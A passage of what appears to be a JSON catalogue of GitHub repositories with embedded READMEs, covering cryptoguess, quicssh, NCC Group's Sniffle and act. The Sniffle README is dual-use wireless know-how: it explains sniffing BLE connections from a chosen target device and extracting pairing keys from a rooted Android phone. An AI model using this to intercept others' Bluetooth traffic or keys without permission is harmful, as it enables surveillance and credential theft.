application\\n\\nUSAGE:\\n cryptoguess [global options] command [command options] [arguments...]\\n\\nVERSION:\\n 0.0.0\\n\\nCOMMANDS:\\n help, h Shows a list of commands or help for one command\\n\\nGLOBAL OPTIONS:\\n --debug, -D (default: false)\\n --list, -l (default: false)\\n --help, -h show help (default: false)\\n --version, -v print the version (default: false)\\n```\\n\\n## Decoders\\n\\n| Encoding | Status | Recursive |\\n|----------------------------------|--------------------|--------------------|\\n| aes | :red_circle: | :red_circle: |\\n| ascii85 | :red_circle: | :red_circle: |\\n| asn1 | :red_circle: | :red_circle: |\\n| base32 | :red_circle: | :red_circle: |\\n| base64 | :white_check_mark: | :white_check_mark: |\\n| cipher | :red_circle: | :red_circle: |\\n| csv | :red_circle: | :red_circle: |\\n| des | :red_circle: | :red_circle: |\\n| dsa | :red_circle: | :red_circle: |\\n| ecdsa | :red_circle: | :red_circle: |\\n| elliptic | :red_circle: | :red_circle: |\\n| encodings (utf-8) | :red_circle: | :red_circle: |\\n| encrypted jwt | :red_circle: | :red_circle: |\\n| gob | :red_circle: | :red_circle: |\\n| gzip,lzw,... | :red_circle: | :red_circle: |\\n| json | :red_circle: | :red_circle: |\\n| pem | :white_check_mark: | :white_check_mark: |\\n| rsa | :red_circle: | :red_circle: |\\n| signed jwt | :white_check_mark: | :red_circle: |\\n| ssh | :white_check_mark: | :red_circle: |\\n| tls | :red_circle: | :red_circle: |\\n| url escaped | :red_circle: | :red_circle: |\\n| x509: DER certificate list | :white_check_mark: | n/a |\\n| x509: Elliptic Curve private key | :white_check_mark: | n/a |\\n| x509: PKCS#1 RSA private key | :white_check_mark: | n/a |\\n| x509: PKCS#8 private key | :white_check_mark: | n/a |\\n| x509: PKCS#8 public key | :white_check_mark: | n/a |\\n| x509: PKIX public key | :white_check_mark: | n/a |\\n| x509: certificate | :white_check_mark: | n/a |\\n| x509: certificate list | :white_check_mark: | n/a |\\n| x509: certificate request | :white_check_mark: | n/a |\\n| x509: certificates | :white_check_mark: | n/a |\\n| xml | :red_circle: | :red_circle: |\\n\\n\\n## Install\\n\\n### CLI\\n\\n```console\\n$ go get -u moul.io/cryptoguess\\n```\\n\\n### Library\\n\\n```console\\n$ go get -u moul.io/cryptoguess/cryptoguess\\n```\\n\\n## As a library\\n\\nSee https://godoc.org/moul.io/cryptoguess/cryptoguess\\n\\n## License\\n\\n\\u00a9 2019 [Manfred Touron](https://manfred.life) -\\n[Apache-2.0 License](https://github.com/moul/cryptoguess/blob/master/LICENSE)\\n\"", "topics": ["cryptography", "decode", "decoder", "forensic", "guess", "hash", "tool"], "writeup": "", "ignoredescription": false, "id": 32, "full_name": "moul/cryptoguess", "url": "https://github.com/moul/cryptoguess"},
{"tags": [], "owner": "moul", "description": "SSH over QUIC", "name": "quicssh", "topics_string": "cli daemon hack proxy quic server ssh", "language": "Go", "readme": "\"# quicssh\\n\\n> :smile: **quicssh** is a QUIC proxy that allows to use QUIC to connect to an SSH server without needing to patch the client or the server.\\n\\n[![CircleCI](https://circleci.com/gh/moul/quicssh.svg?style=shield)](https://circleci.com/gh/moul/quicssh)\\n[![GoDoc](https://godoc.org/moul.io/quicssh?status.svg)](https://godoc.org/moul.io/quicssh)\\n[![License](https://img.shields.io/github/license/moul/quicssh.svg)](https://github.com/moul/quicssh/blob/master/LICENSE)\\n[![GitHub release](https://img.shields.io/github/release/moul/quicssh.svg)](https://github.com/moul/quicssh/releases)\\n[![Go Report Card](https://goreportcard.com/badge/moul.io/quicssh)](https://goreportcard.com/report/moul.io/quicssh)\\n[![Docker Metrics](https://images.microbadger.com/badges/image/moul/quicssh.svg)](https://microbadger.com/images/moul/quicssh)\\n[![Made by Manfred Touron](https://img.shields.io/badge/made%20by-Manfred%20Touron-blue.svg?style=flat)](https://manfred.life/)\\n\\n## Architecture\\n\\nStandard SSH connection\\n\\n```\\n\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\n\\u2502 bob \\u2502 \\u2502 wopr \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502\\n\\u2502 \\u2502 ssh user@wopr \\u2502\\u2500\\u253c\\u2500\\u2500\\u2500\\u2500tcp\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u253c\\u25b6\\u2502 sshd \\u2502 \\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502\\n\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\n```\\n\\n---\\n\\nSSH Connection proxified with QUIC\\n\\n```\\n\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\n\\u2502 bob \\u2502 \\u2502 wopr \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502\\n\\u2502 \\u2502ssh -o ProxyCommand \\\"quicssh client\\u2502 \\u2502 \\u2502 \\u2502 sshd \\u2502 \\u2502\\n\\u2502 \\u2502 --addr %h:4545\\\" user@wopr \\u2502 \\u2502 \\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u25b2 \\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 process \\u2502 \\u2502 tcp to localhost:22 \\u2502\\n\\u2502 \\u2502 \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u25bc \\u2502 \\u2502 \\u2502 \\u2502\\n\\u2502 \\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510 \\u2502 \\u2502\\u250c\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2510\\u2502\\n\\u2502 \\u2502 quicssh client --addr wopr:4545 \\u2502\\u2500\\u253c\\u2500quic (udp)\\u2500\\u2500\\u25b6\\u2502 quicssh server \\u2502\\u2502\\n\\u2502 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2502 \\u2502\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\u2502\\n\\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518 \\u2514\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2518\\n```\\n\\n## Usage\\n\\n```console\\n$ quicssh -h\\nNAME:\\n quicssh - A new cli application\\n\\nUSAGE:\\n quicssh [global options] command [command options] [arguments...]\\n\\nVERSION:\\n 0.0.0\\n\\nCOMMANDS:\\n server\\n client\\n help, h Shows a list of commands or help for one command\\n\\nGLOBAL OPTIONS:\\n --help, -h show help (default: false)\\n --version, -v print the version (default: false)\\n ```\\n\\n### Client\\n\\n```console\\n$ quicssh client -h\\nNAME:\\n quicssh client -\\n\\nUSAGE:\\n quicssh client [command options] [arguments...]\\n\\nOPTIONS:\\n --addr value (default: \\\"localhost:4242\\\")\\n --help, -h show help (default: false)\\n```\\n\\n### Server\\n\\n```console\\n$ quicssh server -h\\nNAME:\\n quicssh server -\\n\\nUSAGE:\\n quicssh server [command options] [arguments...]\\n\\nOPTIONS:\\n --bind value (default: \\\"localhost:4242\\\")\\n --help, -h show help (default: false)\\n```\\n\\n## Install\\n\\n```console\\n$ go get -u moul.io/quicssh\\n```\\n\\n## License\\n\\n\\u00a9 2019 [Manfred Touron](https://manfred.life) -\\n[Apache-2.0 License](https://github.com/moul/quicssh/blob/master/LICENSE)\\n\"", "topics": ["cli", "daemon", "hack", "proxy", "quic", "server", "ssh"], "writeup": "quicssh is a QUIC proxy that allows to use QUIC to connect to an SSH server without needing to patch the client or the server.", "ignoredescription": true, "id": 33, "full_name": "moul/quicssh", "url": "https://github.com/moul/quicssh"},
{"tags": ["sniffing", "blutooth", "ble"], "owner": "nccgroup", "description": "A sniffer for Bluetooth 5 and 4.x LE", "name": "Sniffle", "topics_string": "sniffing blutooth ble", "language": "C", "readme": "\"# Sniffle\\n\\n**Sniffle is a sniffer for Bluetooth 5 and 4.x (LE) using TI CC1352/CC26x2 hardware.**\\n\\nSniffle has a number of useful features, including:\\n\\n* Support for BT5/4.2 extended length advertisement and data packets\\n* Support for BT5 Channel Selection Algorithms #1 and #2\\n* Support for all BT5 PHY modes (regular 1M, 2M, and coded modes)\\n* Support for sniffing only advertisements and ignoring connections\\n* Support for channel map, connection parameter, and PHY change operations\\n* Support for advertisement filtering by MAC address and RSSI\\n* Support for BT5 extended advertising (non-periodic)\\n* Support for capturing advertisements from a target MAC on all three primary\\n advertising channels using a single sniffer. **This makes connection detection\\n nearly 3x more reliable than most other sniffers that only sniff one advertising\\n channel.**\\n* Easy to extend host-side software written in Python\\n* PCAP export compatible with the Ubertooth\\n\\n## Prerequisites\\n\\n* TI CC26x2R Launchpad Board: <https://www.ti.com/tool/LAUNCHXL-CC26X2R1>\\n* or TI CC2652RB Launchpad Board: <https://www.ti.com/tool/LP-CC2652RB>\\n* or TI CC1352R Launchpad Board: <https://www.ti.com/tool/LAUNCHXL-CC1352R1>\\n* GNU ARM Embedded Toolchain: <https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads>\\n* TI CC26x2 SDK 4.10.00.78: <https://www.ti.com/tool/download/SIMPLELINK-CC13X2-26X2-SDK>\\n* TI SysConfig 1.4.0\\\\_1234: <https://www.ti.com/tool/download/SYSCONFIG>\\n* TI DSLite Programmer Software: see below\\n* Python 3.5+ with PySerial installed\\n\\n**If you don't want to go through the effort of setting up a build\\nenvironment for the firmware, you can just flash prebuilt firmware binaries\\nusing UniFlash/DSLite.** Prebuilt firmware binaries are attached to releases\\non the GitHub releases tab of this project. When using prebuilt firmware, be\\nsure to use the Python code corresponding to the release tag rather than master\\nto avoid compatibility issues with firmware that is behind the master branch.\\n\\nNote: it should be possible to compile Sniffle to run on CC1352P Launchpad\\nboards with minimal modifications, but I have not yet tried this.\\n\\n### Installing GCC\\n\\nThe `arm-none-eabi-gcc` provided through various Linux distributions' package\\nmanager often lacks some header files or requires some changes to linker\\nconfiguration. For minimal hassle, I suggest using the ARM GCC linked above.\\nYou can just download and extract the prebuilt executables.\\n\\n### Installing the TI SDK\\n\\nThe TI SDK is provided as an executable binary that extracts a bunch of source\\ncode once you accept the license agreement. On Linux and Mac, the default\\ninstallation directory is inside`~/ti/`. This works fine and my makefiles\\nexpect this path, so I suggest just going with the default here. The same\\napplies for the TI SysConfig tool.\\n\\nOnce the SDK has been extracted, you will need to edit one makefile to match\\nyour build environment. Within `~/ti/simplelink_cc13x2_26x2_sdk_4_10_00_78`\\n(or wherever the SDK was installed) there is a makefile named `imports.mak`.\\nThe only paths that need to be set here to build Sniffle are for GCC, XDC, and\\nSysConfig. We don't need the CCS compiler. See the diff below as an example,\\nand adapt for wherever you installed things.\\n\\n```\\ndiff --git a/imports.mak b/imports.mak\\nindex 5a8fb0cb..e99a03e7 100644\\n--- a/imports.mak\\n+++ b/imports.mak\\n@@ -18,12 +18,12 @@\\n # will build using each non-empty *_ARMCOMPILER cgtool.\\n #\\n \\n-XDC_INSTALL_DIR ?= /home/username/ti/xdctools_3_61_00_16_core\\n-SYSCONFIG_TOOL ?= /home/username/ti/ccs1000/ccs/utils/sysconfig_1.4.0/sysconfig_cli.sh\\n+XDC_INSTALL_DIR ?= $(HOME)/ti/xdctools_3_61_00_16_core\\n+SYSCONFIG_TOOL ?= $(HOME)/ti/sysconfig_1.4.0/sysconfig_cli.sh\\n \\n \\n-CCS_ARMCOMPILER ?= /home/username/ti/ccs1000/ccs/tools/compiler/ti-cgt-arm_20.2.0.LTS\\n-GCC_ARMCOMPILER ?= /home/username/ti/ccs1000/ccs/tools/compiler/gcc-arm-none-eabi-9-2019-q4-major\\n+CCS_ARMCOMPILER ?= $(HOME)/ti/ccs1000/ccs/tools/compiler/ti-cgt-arm_20.2.0.LTS\\n+GCC_ARMCOMPILER ?= $(HOME)/arm_tools/gcc-arm-none-eabi-9-2019-q4-major\\n \\n # The IAR compiler is not supported on Linux\\n # IAR_ARMCOMPILER ?=\\n```\\n\\n### Obtaining DSLite\\n\\nDSLite is TI's command line programming and debug server tool for XDS110\\ndebuggers. The CC26xx and CC13xx Launchpad boards both include XDS110 debuggers.\\nUnfortunately, TI does not provide a standalone command line DSLite download.\\nThe easiest way to obtain DSLite is to install [UniFlash](http://www.ti.com/tool/download/UNIFLASH)\\nfrom TI. It's available for Linux, Mac, and Windows. The DSLite executable will\\nbe located at `deskdb/content/TICloudAgent/linux/ccs_base/DebugServer/bin/DSLite`\\nrelative to the UniFlash installation directory. On Linux, the default UniFlash\\ninstallation directory is inside `~/ti/`.\\n\\nYou should place the DSLite executable directory within your `$PATH`.\\n\\n## Building and Installation\\n\\nOnce the GCC, DSLite, and the SDK is installed and operational, building\\nSniffle should be straight forward. Just navigate to the `fw` directory and\\nrun `make`. If you didn't install the SDK to the default directory, you may\\nneed to edit `SIMPLELINK_SDK_INSTALL_DIR` in the makefile.\\n\\nTo install Sniffle on a (plugged in) CC26x2 Launchpad using DSLite, run\\n`make load` within the `fw` directory. You can also flash the compiled\\n`sniffle.out` binary using the UniFlash GUI.\\n\\nIf building for or installing on a CC1352R Launchpad instead of a CC26x2R,\\nyou must specify `PLATFORM=CC1352R1F3`, either as an argument to make, or\\nby defining it as an environment variable prior to invoking make. Similarly,\\nspecify `PLATFORM=CC2652RB1F` when building for CC2652RB Launchpad instead of\\nthe regular CC26x2R version. Be sure to perform a `make clean` before building\\nfor a different platform.\\n\\n## Sniffer Usage\\n\\n```\\n[skhan@serpent python_cli]$ ./sniff_receiver.py --help\\nusage: sniff_receiver.py [-h] [-s SERPORT] [-c {37,38,39}] [-p] [-r RSSI]\\n [-m MAC] [-a] [-e] [-H] [-l] [-o OUTPUT]\\n\\nHost-side receiver for Sniffle BLE5 sniffer\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n -s SERPORT, --serport SERPORT\\n Sniffer serial port name\\n -c {37,38,39}, --advchan {37,38,39}\\n Advertising channel to listen on\\n -p, --pause Pause sniffer after disconnect\\n -r RSSI, --rssi RSSI Filter packets by minimum RSSI\\n -m MAC, --mac MAC Filter packets by advertiser MAC\\n -i IRK, --irk IRK Filter packets by advertiser IRK\\n -a, --advonly Sniff only advertisements, don't follow connections\\n -e, --extadv Capture BT5 extended (auxiliary) advertising\\n -H, --hop Hop primary advertising channels in extended mode\\n -l, --longrange Use long range (coded) PHY for primary advertising\\n -o OUTPUT, --output OUTPUT\\n PCAP output file name\\n```\\n\\nThe XDS110 debugger on the Launchpad boards creates two serial ports. On\\nLinux, they are typically named `ttyACM0` and `ttyACM1`. The first of the\\ntwo created serial ports is used to communicate with Sniffle. By default,\\nthe Python CLI communicates using `/dev/ttyACM0`, but you may need to\\noverride this with the `-s` command line option if you are not running on\\nLinux or have additional USB CDC-ACM devices connected.\\n\\nFor the `-r` (RSSI filter) option, a value of -40 tends to work well if the\\nsniffer is very close to or nearly touching the transmitting device. The RSSI\\nfilter is very useful for ignoring irrelevant advertisements in a busy RF\\nenvironment. The RSSI filter is only active when capturing advertisements,\\nas you always want to capture data channel traffic for a connection being\\nfollowed. You probably don't want to use an RSSI filter when MAC filtering\\nis active, as you may lose advertisements from the MAC address of interest\\nwhen the RSSI is too low.\\n\\nTo hop along with advertisements and have reliable connection sniffing, you\\nneed to set up a MAC filter with the `-m` option. You should specify the\\nMAC address of the peripheral device, not the central device. To figure out\\nwhich MAC address to sniff, you can run the sniffer with RSSI filtering while\\nplacing the sniffer near the target. This will show you advertisements from\\nthe target device including its MAC address. It should be noted that many BLE\\ndevices advertise with a randomized MAC address rather than their \\\"real\\\" fixed\\nMAC written on a label.\\n\\nFor convenience, there is a special mode for the MAC filter by invoking the\\nscript with `-m top` instead of `-m` with a MAC address. In this mode, the\\nsniffer will lock onto the first advertiser MAC address it sees that passes\\nthe RSSI filter. The `-m top` mode should thus always be used with an RSSI\\nfilter to avoid locking onto a spurious MAC address. Once the sniffer locks\\nonto a MAC address, the RSSI filter will be disabled automatically by the\\nsniff receiver script (except when the `-e` option is used).\\n\\nMost new BLE devices use Resolvable Private Addresses (RPAs) rather than fixed\\nstatic or public addresses. While you can set up a MAC filter to a particular\\nRPA, devices periodically change their RPA. RPAs can can be resolved (associated\\nwith a particular device) if the Identity Resolving Key (IRK) is known. Sniffle\\nsupports automated RPA resolution when the IRK is provided. This avoids the need\\nto keep updating the MAC filter whenever the RPA changes. You can specify an\\nIRK for Sniffle with the `-i` option; the IRK should be provided in hexadecimal\\nformat, with the most significant byte (MSB) first. Specifying an IRK allows\\nSniffle to channel hop with an advertiser the same way it does with a MAC filter.\\nThe IRK based MAC filtering feature (`-i`) is mutually exclusive with the static\\nMAC filtering feature (`-m`).\\n\\nTo enable following auxiliary pointers in Bluetooth 5 extended advertising,\\nenable the `-e` option. To improve performance and reliability in extended\\nadvertising capture, this option disables hopping on the primary advertising\\nchannels, even when a MAC filter is set up. If you are unsure whether a\\nconnection will be established via legacy or extended advertising, you can\\nenable the `-H` flag in conjunction with `-e` to perform primary channel\\nhopping with legacy advertisements, and scheduled listening to extended\\nadvertisement auxiliary packets. When combining `-e` and `-H`, the\\nreliability of connection detection may be reduced compared to hopping on\\nprimary (legacy) or secondary (extended) advertising channels alone.\\n\\nTo sniff the long range PHY on primary advertising channels, specify the `-l`\\noption. Note that no hopping between primary advertising channels is supported\\nin long range mode, since all long range advertising uses the BT5 extended\\nmechanism. Under the extended mechanism, auxiliary pointers on all three\\nprimary channels point to the same auxiliary packet, so hopping between\\nprimary channels is unnecessary.\\n\\nIf for some reason the sniffer firmware locks up and refuses to capture any\\ntraffic even with filters disabled, you should reset the sniffer MCU. On\\nLaunchpad boards, the reset button is located beside the micro USB port.\\n\\n## Scanner Usage\\n\\n```\\nsultan@sultan-neon-vm:~/sniffle/python_cli$ ./scanner.py --help\\nusage: scanner.py [-h] [-s SERPORT] [-c {37,38,39}] [-r RSSI] [-e] [-l]\\n\\nScanner utility for Sniffle BLE5 sniffer\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n -s SERPORT, --serport SERPORT\\n Sniffer serial port name\\n -c {37,38,39}, --advchan {37,38,39}\\n Advertising channel to listen on\\n -r RSSI, --rssi RSSI Filter packets by minimum RSSI\\n -e, --extadv Capture BT5 extended (auxiliary) advertising\\n -l, --longrange Use long range (coded) PHY for primary advertising\\n```\\n\\nThe scanner command line arguments work the same as the sniffer. The purpose of\\nthe scanner utility is to passively gather a list of nearby devices advertising,\\nwithout having the deluge of fast scrolling data you get with the sniffer\\nutility. The hardware/firmware works exactly the same, but the scanner utility\\nwill record and report observed MAC addresses only once without spamming the\\ndisplay. Once you're done capturing advertisements, press Ctrl-C to stop\\nscanning and report the results. The scanner will show the last advertisement\\nand scan response from each target. Scan results will be sorted by RSSI in\\ndescending order.\\n\\n## Usage Examples\\n\\nSniff all advertisements on channel 38, ignore RSSI < -50, stay on advertising\\nchannel even when CONNECT\\\\_REQs are seen.\\n\\n```\\n./sniff_receiver.py -c 38 -r -50 -a\\n```\\n\\nSniff advertisements from MAC 12:34:56:78:9A:BC, stay on advertising channel\\neven when CONNECT\\\\_REQs are seen, save advertisements to `data1.pcap`.\\n\\n```\\n./sniff_receiver.py -m 12:34:56:78:9A:BC -a -o data1.pcap\\n```\\n\\nSniff advertisements and connections for the first MAC address seen with\\nRSSI >= -40. The RSSI filter will be disabled automatically once a MAC address\\nhas been locked onto. Save captured data to `data2.pcap`.\\n\\n```\\n./sniff_receiver.py -m top -r -40 -o data2.pcap\\n```\\n\\nSniff advertisements and connections from the peripheral with big endian IRK\\n4E0BEA5355866BE38EF0AC2E3F0EBC22.\\n\\n```\\n./sniff_receiver.py -i 4E0BEA5355866BE38EF0AC2E3F0EBC22\\n```\\n\\nSniff BT5 extended advertisements and connections from nearby (RSSI >= -55) devices.\\n\\n```\\n./sniff_receiver.py -r -55 -e\\n```\\n\\nSniff legacy and extended advertisements and connections from the device with the\\nspecified MAC address. Save captured data to `data3.pcap`.\\n\\n```\\n./sniff_receiver.py -eH -m 12:34:56:78:9A:BC -o data3.pcap\\n```\\n\\nSniff extended advertisements and connections using the long range primary PHY on\\nchannel 38.\\n\\n```\\n./sniff_receiver.py -le -c 38\\n```\\n\\nPassively scan on channel 39 for advertisements with RSSI greater than -50, and\\nenable capture of extended advertising.\\n\\n```\\n./scanner.py -c 39 -e -r -50\\n```\\n\\n## Obtaining the IRK\\n\\nIf you have a rooted Android phone, you can find IRKs (and LTKs) in the Bluedroid\\nconfiguration file. On Android 8.1, this is located at `/data/misc/bluedroid/bt_config.conf`.\\nThe `LE_LOCAL_KEY_IRK` specifies the Android device's own IRK, and the first 16\\nbytes of `LE_KEY_PID` for every bonded device in the file indicate the bonded\\ndevice's IRK. Be aware that keys stored in this file are little endian, so\\n**the byte order of keys in this file will need to be reversed.** For example,\\nthe little endian IRK 22BC0E3F2EACF08EE36B865553EA0B4E needs to be changed to\\n4E0BEA5355866BE38EF0AC2E3F0EBC22 (big endian) when being passed to Sniffle with\\nthe `-i` option.\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 34, "full_name": "nccgroup/Sniffle", "url": "https://github.com/nccgroup/Sniffle"},
{"tags": [], "owner": "nektos", "description": "Run your GitHub Actions locally \ud83d\ude80", "name": "act", "topics_string": "ci devops github-actions golang", "language": "Go", "readme": "\"![](https://github.com/nektos/act/wiki/img/logo-150.png)\\n\\n# Overview [![push](https://github.com/nektos/act/workflows/push/badge.svg?branch=master&event=push)](https://github.com/nektos/act/actions) [![Join the chat at https://gitter.im/nektos/act](https://badges.gitter.im/nektos/act.svg)](https://gitter.im/nektos/act?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Go Report Card](https://goreportcard.com/badge/github.com/nektos/act)](https://goreportcard.com/report/github.com/nektos/act)\\n\\n> \\\"Think globally, <code>act</code> locally\\\"\\n\\nRun your [GitHub Actions](https://developer.github.com/actions/) locally! Why would you want to do this? Two reasons:\\n\\n- **Fast Feedback** - Rather than having to commit/push every time you want to test out the changes you are making to your `.github/workflows/` files (or for any changes to embedded GitHub actions), you can use `act` to run the actions locally. The [environment variables](https://help.github.com/en/actions/configuring-and-managing-workflows/using-environment-variables#default-environment-variables) and [filesystem](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners#filesystems-on-github-hosted-runners) are all configured to match what GitHub provides.\\n- **Local Task Runner** - I love [make](<https://en.wikipedia.org/wiki/Make_(software)>). However, I also hate repeating myself. With `act`, you can use the GitHub Actions defined in your `.github/workflows/` to replace your `Makefile`!\\n\\n# How Does It Work?\\n\\nWhen you run `act` it reads in your GitHub Actions from `.github/workflows/` and determines the set of actions that need to be run. It uses the Docker API to either pull or build the necessary images, as defined in your workflow files and finally determines the execution path based on the dependencies that were defined. Once it has the execution path, it then uses the Docker API to run containers for each action based on the images prepared earlier. The [environment variables](https://help.github.com/en/actions/configuring-and-managing-workflows/using-environment-variables#default-environment-variables) and [filesystem](https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners#filesystems-on-github-hosted-runners) are all configured to match what GitHub provides.\\n\\nLet's see it in action with a [sample repo](https://github.com/cplee/github-actions-demo)!\\n\\n![Demo](https://github.com/nektos/act/wiki/quickstart/act-quickstart-2.gif)\\n\\n# Installation\\n\\nTo install with [Homebrew](https://brew.sh/), run:\\n\\n`brew install nektos/tap/act`\\n\\nAlternatively, you can use the following:\\n\\n`curl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash`\\n\\nIf you are running Windows, download the [latest release](https://github.com/nektos/act/releases/latest) and add the binary into your PATH. \\nIf you are using [Chocolatey](https://chocolatey.org/) then run: \\n`choco install act-cli`\\n\\nIf you are using [Scoop](https://scoop.sh/) then run: \\n`scoop install act`\\n\\nIf you are running Arch Linux, you can install the [act](https://aur.archlinux.org/packages/act/) package with your favorite package manager:\\n\\n`yay -S act`\\n\\nIf you are using NixOS or the Nix package manager on another platform you can install act globally by running\\n\\n`nix-env -iA nixpkgs.act`\\n\\nor in a shell by running\\n\\n`nix-shell -p act`\\n\\n# Commands\\n\\n```\\n# List the actions\\nact -l\\n\\n# Run the default (`push`) event:\\nact\\n\\n# Run a specific event:\\nact pull_request\\n\\n# Run a specific job:\\nact -j test\\n\\n# Run in dry-run mode:\\nact -n\\n\\n# Enable verbose-logging (can be used with any of the above commands)\\nact -v\\n```\\n\\n# Flags\\n\\n```\\n -b, --bind bind working directory 